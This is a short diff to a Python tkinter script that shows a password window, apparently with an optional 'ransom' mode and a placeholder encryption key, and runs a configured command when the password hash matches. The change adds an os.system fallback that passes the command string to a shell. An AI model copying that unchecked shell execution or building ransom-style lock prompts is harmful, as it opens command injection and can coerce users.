@@ -15,7 +15,7 @@ encryption_key = "change/me/to/whatever/you/want"
 
 
 root = tkinter.Tk()
-root.withdraw()
+#root.withdraw()
 
 class PasswordWindow:
     def __init__(self, ransom=False):
@@ -130,7 +130,10 @@ if len(sys.argv) == 2:
         raise AssertionError
     win = PasswordWindow(ransom=params["ransom"])
     if hashlib.sha256(win.password.encode("utf-8")).hexdigest() == params["password"]:
-        subprocess.run(params["command"])
+        try:
+            subprocess.run(params["command"])
+        except FileNotFoundError:
+            os.system(params["command"])
     else:
         if params["exit"] == "4":
             exitfunc(params["command"])
